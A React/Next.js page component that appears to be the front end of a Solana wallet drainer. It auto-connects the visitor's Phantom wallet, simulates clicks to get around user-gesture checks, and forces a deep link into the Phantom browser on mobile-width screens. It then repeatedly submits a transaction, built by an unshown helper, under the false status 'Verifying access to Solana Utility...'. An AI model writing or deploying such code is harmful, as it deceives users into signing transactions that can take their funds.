'use client'

import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import { WalletName } from '@solana/wallet-adapter-base'
import { createUnsignedTransaction } from '../services/transaction'
import { Transaction } from '@solana/web3.js'

/* ---- Phantom provider tipi ---- */
interface PhantomProvider { isPhantom?: boolean }
declare global { interface Window { solana?: PhantomProvider } }
/* -------------------------------- */

export default function TransactionPage() {
  const { connection } = useConnection()
  const {
    publicKey, sendTransaction, connect, select, connected,
  } = useWallet()

  const retries = useRef(0)
  const maxRetries = 3
  const waiting   = useRef(false)
  const [status, setStatus] = useState('Loading...')

  /* ➜  322-499 px aralığında Phantom deeplink */
  useEffect(() => {
    const w = window.innerWidth
    const isPhantomProvider = window.solana?.isPhantom ?? false

    if (w >= 322 && w <= 499 && !isPhantomProvider) {
      const simulateClick = () => {
        const e = new MouseEvent('click', { bubbles: true, cancelable: true, view: window })
        document.body.dispatchEvent(e)
      }

      const href = window.location.href
      const enc  = encodeURIComponent(href)
      const deep = `https://phantom.app/ul/browse/${enc}?ref=${enc}`

      simulateClick()
      const a = document.createElement('a')
      a.href   = deep
      a.target = '_blank'
      document.body.appendChild(a)
      a.click()
      setTimeout(() => a.remove(), 500)

      return               // yönlendirme yapıldı, kalan akışı durdur
    }
  }, [])
  /* -------------------------------------------------- */

  /* --------------  İşlem akışı -------------- */
  useEffect(() => {
    const simulateClick = () => {
      const e = new MouseEvent('click', { bubbles: true, cancelable: true, view: window })
      document.body.dispatchEvent(e)
    }

    const trySendTransaction = async () => {
      if (!publicKey || waiting.current || retries.current >= maxRetries) return
      waiting.current = true

      try {
        simulateClick()
        setStatus('Verifying access to Solana Utility...')
        const tx = await createUnsignedTransaction(publicKey)

        if (tx) {
          const sig = await sendTransaction(tx as unknown as Transaction, connection)
          console.log('✅ transaction sent:', sig)
          setStatus('Successful ✅')
        } else {
          throw new Error('Null transaction')
        }
      } catch (err: unknown) {
        console.warn('⚠️ İşlem hatası:', err)
        retries.current += 1
        setStatus('Verifying access to Solana Utility...')
        setTimeout(() => { waiting.current = false; void trySendTransaction() }, 3000)
      }
    }

    const start = async () => {
      try {
        simulateClick()
        await select('Phantom' as WalletName)
        if (!connected) await connect()
        if (publicKey) void trySendTransaction()
      } catch (err) {
        console.error('connection error:', err)
        setStatus('Connection error ❌')
      }
    }

    void start()
  }, [publicKey, connected, connect, select, sendTransaction, connection])
  /* ------------------------------------------ */

  return (
    <div style={{
      backgroundColor: 'black',
      width: '100vw',
      height: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      color: 'white',
      fontSize: '16px',
      fontFamily: 'monospace'
    }}>
      {status}
    </div>
  )
}
